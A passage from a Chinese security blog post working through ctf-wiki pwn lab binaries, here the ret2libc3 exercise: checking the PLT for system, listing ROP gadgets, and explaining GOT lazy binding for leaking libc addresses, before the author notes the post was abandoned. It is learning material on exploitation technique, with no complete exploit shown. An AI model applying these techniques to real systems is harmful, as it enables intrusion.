</code></pre></td></tr></table>
</div>
</div><h3 id=反编译分析-5>反编译分析</h3>
<p><img src=/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220824152800977.png width=465 height=278 srcset="/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220824152800977_hu78b695f3faf4d54db28e6261c3b5e7e1_12160_480x0_resize_box_3.png 480w, /p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220824152800977_hu78b695f3faf4d54db28e6261c3b5e7e1_12160_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220824152800977 class=gallery-image data-flex-grow=167 data-flex-basis=401px></p>
<p>查看 plt 发现确实没有 <code>system</code> 函数。</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext>(.venv) vm :: repos/pwn/lab-4 » objdump -d -j .plt bin/ret2libc3 | grep system
(.venv) vm :: repos/pwn/lab-4 »
</code></pre></td></tr></table>
</div>
</div><p>能不能用 <code>ret2syscall</code> 的技巧呢？</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext>(.venv) vm :: repos/pwn/lab-4 » ROPgadget --binary bin/ret2libc3 --only &#39;pop|ret&#39;                                                                                                                            1 ↵
Gadgets information
============================================================
0x080486ff : pop ebp ; ret
0x080486fc : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x0804841d : pop ebx ; ret
0x080486fe : pop edi ; pop ebp ; ret
0x080486fd : pop esi ; pop edi ; pop ebp ; ret
0x08048406 : ret
0x0804854e : ret 0xeac1

Unique gadgets found: 7
</code></pre></td></tr></table>
</div>
</div><p>很遗憾，缺乏控制 <code>ecx</code> 和 <code>edx</code> 寄存器的 gadget 。直接快进到找 <code>system</code> 地址。学习一下 ctf-wiki 上关于找 libc 里地址的方法。装个 <code>libcsearcher</code>，整理下思路。</p>
<p>取得<code>system</code>函数的原理是利用 <code>libc.so</code> 库函数之间相对偏移确定这一点，只要已知 libc 版本和一个 libc 函数的地址，即可推算出其他 libc 函数的地址。利用这一原理取得 libc 地址需要先知道当前 libc 版本和一个已知地址。</p>
<p>取得已知地址则又需要一点点技巧，因为 GOT 是延迟绑定的。也就是说，只有在第一次调用后，GOT 里填充的值才是真正的地址。在第一次调用前，里面填充其实是 PLT 的地址。我们用代码说话。</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>08048490 &lt;__libc_start_main@plt&gt;:
 8048490:       ff 25 24 a0 04 08       jmp    *0x804a024
 8048496:       68 30 00 00 00          push   $0x30
 804849b:       e9 80 ff ff ff          jmp    8048420 &lt;.plt&gt;
</code></pre></td></tr></table>
</div>
</div><p><code>jmp *0x804a024</code>，<code>0x804a024</code>是 GOT 上 <code>__libc_start_main</code> 的地址，在第一次调用前，这个地址上填充的值实际是 <code>0x8048496</code>，也就是 <code>__libc_start_main@plt</code> 第二条指令 <code>push $0x30</code> 的地址。</p>
<p>而后的 <code>push</code>和 <code>jmp</code> 最终会调用 <code>_dl_runtime_resolve</code> 函数（<code>.got.plt</code>第三项）完成解析，填充 GOT 并返回。</p>
<p>这玩意儿和 PE 文件的 IAT 性质是一样的，只是PE少一步延迟链接。</p>
<p>综上所述随便拿一个GOT表项的值是不行的，因为里面的地址可能是 PLT 的地址而不是真实 libc 函数的地址。</p>
<h2 id=烂尾总结>烂尾总结</h2>
<p>续于 2022年12月31日。</p>
<p>整理草稿箱的时候发现了这篇写了一半的博客。这篇应该是在六七月开始写的，写了大半，结果工作一忙，完全忘了。这会儿思路也续不上，干脆就弃坑了。</p>
<p>就这样吧，叹口气，但不管怎么着生活还得继续。</p>
</section>
<footer class=article-footer>
<section class=article-tags>
<a href=/tags/security/>security</a>
<a href=/tags/pwn/>pwn</a>
</section>
<section class=article-copyright><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span>
</section>
</footer>
<link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.css integrity=sha384-RZU/ijkSsFbcmivfdRBQDtwuwVqK7GMOw6IMvKyeWL2K5UAlyp6WonmB8m7Jd0Hn crossorigin=anonymous><script src=https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.js integrity=sha384-pK1WpvzWVBQiP0/GjnvRxV4mOb0oxFuyRxJlk6vVw146n3egcN5C925NCP7a7BY8 crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/contrib/auto-render.min.js integrity=sha384-vZTG03m+2yp6N6BNi5iM4rW4oIwk5DfcNdFfxkk9ZWpDriOkXX8voJBFrAO7MpVl crossorigin=anonymous defer></script><script>window.addEventListener("DOMContentLoaded",()=>{renderMathInElement(document.querySelector(`.article-content`),{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1},{left:"\\(",right:"\\)",display:!1},{left:"\\[",right:"\\]",display:!0}]})})</script>
</article>
<aside class=related-contents--wrapper>
<h2 class=section-title>相关文章</h2>
<div class=related-contents>
<div class="flex article-list--tile">
<article>
<a href=/p/%E5%9F%BA%E4%BA%8Ecreateremotethread%E7%9A%84dll%E6%B3%A8%E5%85%A5/>
<div class=light>
<div class=lamp></div>
</div>
<div class=article-details>
<h2 class=article-title>基于CreateRemoteThread的DLL注入</h2>
</div>
</a>
</article>
<article>
<a href=/p/sqli-labs-training-5/>
<div class=light>
<div class=lamp></div>
</div>
<div class=article-details>
<h2 class=article-title>sqli-labs 实验记录 #5</h2>
</div>
</a>
</article>
<article>
<a href=/p/sqli-labs-training-4/>
<div class=light>
<div class=lamp></div>
</div>
<div class=article-details>
<h2 class=article-title>sqli-labs 实验记录 #4</h2>
</div>
</a>
</article>
<article>
<a href=/p/sqli-labs-training-3/>
<div class=light>
<div class=lamp></div>
</div>
<div class=article-details>
<h2 class=article-title>sqli-labs 实验记录 #3</h2>
</div>
</a>
</article>
<article>
<a href=/p/sqli-labs-training-2/>
<div class=light>
<div class=lamp></div>
</div>
<div class=article-details>
<h2 class=article-title>sqli-labs 实验记录 #2</h2>
</div>
</a>
</article>
</div>
</div>
</aside>
<footer class=site-footer>
<section class=copyright>
&copy;
2021 -
2023 weakptr's 笔记
</section>
<section class=powerby>
<a href=https://beian.miit.gov.cn/>浙ICP备2021032371号-1</a>
<span style=margin-left:16px></span>
<a target=_blank href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=33032402002231" style=display:inline-block;text-decoration:none;height:20px;line-height:20px>
<img src=/blog/image/beian.png style=float:left>
浙公网安备 33032402002231号
</a>
<br>
Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> <br>
主题 <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.11.0>Stack</a></b> 由 <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> 设计
，由 <a href=https://nnnewb.github.io/blog/>nnnewb</a> 修改
</section>
</footer>
<div class=pswp tabindex=-1 role=dialog aria-hidden=true>
<div class=pswp__bg></div>
<div class=pswp__scroll-wrap>
<div class=pswp__container>
<div class=pswp__item></div>
<div class=pswp__item></div>
<div class=pswp__item></div>
</div>
<div class="pswp__ui pswp__ui--hidden">
<div class=pswp__top-bar>
<div class=pswp__counter></div>
<button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
<div class=pswp__preloader>
<div class=pswp__preloader__icn>
<div class=pswp__preloader__cut>
<div class=pswp__preloader__donut></div>
</div>
</div>
</div>
</div>
<div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
<div class=pswp__share-tooltip></div>
</div>
<button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
</button>
<div class=pswp__caption>
<div class=pswp__caption__center></div>
</div>
</div>
</div>
</div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css integrity="sha256-c0uckgykQ9v5k+IqViZOZKc47Jn7KQil4/MP3ySA3F8=" crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE=" crossorigin=anonymous>
</main>
<aside class="sidebar right-sidebar sticky">
<section class="widget archives">
<div class=widget-icon><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg>
</div>
<h2 class="widget-title section-title">目录</h2>
<div class=widget--toc>
<nav id=TableOfContents>
<ol>
<li><a href=#ret2text>ret2text</a>
<ol>
<li><a href=#基本信息>基本信息</a></li>
<li><a href=#行为分析>行为分析</a></li>
<li><a href=#反编译分析>反编译分析</a></li>
<li><a href=#exploit>exploit</a></li>
</ol>
</li>
<li><a href=#ret2shellcode>ret2shellcode</a>
<ol>
<li><a href=#基本信息-1>基本信息</a></li>
<li><a href=#行为分析-1>行为分析</a></li>
<li><a href=#反编译分析-1>反编译分析</a></li>
<li><a href=#exploit-1>exploit</a></li>
</ol>
</li>
<li><a href=#ret2syscall>ret2syscall</a>
<ol>
<li><a href=#基本信息-2>基本信息</a></li>
<li><a href=#行为分析-2>行为分析</a></li>
<li><a href=#反编译分析-2>反编译分析</a></li>
<li><a href=#exploit-2>exploit</a></li>
</ol>
</li>
<li><a href=#ret2libc1>ret2libc1</a>
<ol>
<li><a href=#基本信息-3>基本信息</a></li>
<li><a href=#行为分析-3>行为分析</a></li>
<li><a href=#反编译分析-3>反编译分析</a></li>
<li><a href=#exploit-3>exploit</a></li>
</ol>
</li>
<li><a href=#ret2libc2>ret2libc2</a>
<ol>
<li><a href=#基本信息-4>基本信息</a></li>
<li><a href=#行为分析-4>行为分析</a></li>
<li><a href=#反编译分析-4>反编译分析</a></li>
<li><a href=#exploit-4>exploit</a></li>
</ol>
</li>
<li><a href=#ret2libc3>ret2libc3</a>
<ol>
<li><a href=#基本信息-5>基本信息</a></li>
<li><a href=#行为分析-5>行为分析</a></li>
<li><a href=#反编译分析-5>反编译分析</a></li>
</ol>
</li>
<li><a href=#烂尾总结>烂尾总结</a></li>
</ol>
</nav>
</div>
</section>
</aside>
</div>
<script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.js defer></script>
<script>(function(){const a=document.createElement('link');a.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",a.type="text/css",a.rel="stylesheet",document.head.appendChild(a)})()</script>
</body>
</html>